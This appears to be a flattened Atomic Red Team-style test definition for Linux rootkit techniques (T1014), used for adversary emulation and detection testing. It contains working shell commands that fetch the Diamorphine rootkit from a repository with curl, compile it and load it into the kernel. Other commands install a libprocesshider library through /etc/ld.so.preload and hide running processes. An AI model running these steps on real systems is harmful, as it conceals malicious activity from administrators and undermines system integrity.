rootkit_source_path.description: Path to the rootkit source. Used when prerequisites are fetched.

dependencies.description: The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)
dependencies.prereq_command: if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
dependencies.get_prereq_command:
sudo apt install make
sudo apt install gcc
if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;
cp #{rootkit_source_path}/* /tmp/T1014/
cd /tmp/T1014; make
mkdir #{rootkit_path}
mv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko
rm -rf /tmp/T1014

executor.name: sh

rootkit_source_path.description: Path to the rootkit source. Used when prerequisites are fetched.

dependencies.description: The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)
dependencies.prereq_command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
dependencies.get_prereq_command:
sudo apt install make
sudo apt install gcc
if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;
cp #{rootkit_source_path}/* /tmp/T1014
cd /tmp/T1014; make        
sudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/
[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014
sudo depmod -a

atomic_tests.name: dynamic-linker based rootkit (libprocesshider)
atomic_tests.description: Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).

executor.name: sh
executor.command:
echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"

repo.description: Url of the github repo zip

rev.description: Revision of the github repo zip

library_path.description: Full path of the library to add to ld.so.preload

dependencies.description: The preload library must exist on disk at specified location (#{library_path})
dependencies.prereq_command: if [ -f #{library_path} ]; then exit 0; else exit 1; fi;

atomic_tests.name: Loadable Kernel Module based Rootkit (Diamorphine)
atomic_tests.description: Loads Diamorphine kernel module, which hides itself and a processes.

executor.name: sh
executor.command:
sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID="$!"
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo "process ${TARGETPID} hidden"
executor.cleanup_command:
kill -63 1
sudo modprobe -r #{rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
sudo depmod -a

repo.description: Url of the diamorphine github repo

rev.description: Revision of the github repo zip

dependencies.description: The kernel module must exist on disk at specified location (#{rootkit_name}.ko)
dependencies.prereq_command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
dependencies.get_prereq_command:
mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
make
sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
sudo depmod -a
